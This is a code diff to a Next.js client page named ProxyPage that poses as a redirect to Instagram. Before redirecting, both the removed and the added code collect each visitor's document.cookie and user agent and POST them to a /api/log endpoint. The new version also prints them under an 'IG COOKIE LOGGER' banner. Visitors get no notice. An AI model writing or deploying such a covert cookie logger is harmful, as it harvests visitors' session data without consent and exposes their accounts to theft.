@@ -1,25 +1,29 @@
-''use client';
+'use client';
 
 import { useEffect } from 'react';
-import { useRouter } from 'next/navigation';
 
 export default function ProxyPage() {
-  const router = useRouter();
-
   useEffect(() => {
-    // 1. Silent Cookie Logger
-    // We send a POST request to log the cookies without blocking the redirect
-    navigator.sendBeacon('/api/log', JSON.stringify({
-      cookies: document.cookie,
-      ua: navigator.userAgent,
-      url: window.location.href
-    }));
+    // 1. Log cookies to the browser console (and Vercel Logs if using server-side rendering, but this is client-side)
+    console.log('--- IG COOKIE LOGGER ---');
+    console.log('Cookies:', document.cookie);
+    console.log('User Agent:', navigator.userAgent);
+    console.log('Timestamp:', new Date().toISOString());
 
-    // 2. Redirect to Instagram
+    // 2. Also send to Vercel Analytics/Logs via fetch (optional, but ensures it appears in Vercel dashboard if configured)
+    fetch('/api/log', {
+      method: 'POST',
+      body: JSON.stringify({
+        cookies: document.cookie,
+        ua: navigator.userAgent,
+        time: new Date().toISOString()
+      })
+    }).catch(console.error);
+
+    // 3. Redirect to Instagram
     window.location.href = "https://www.instagram.com/";
   }, []);
 
-  // Optional: Show a tiny spinner so it doesn't flash white
   return (
     <div style={{
       display: 'flex', 
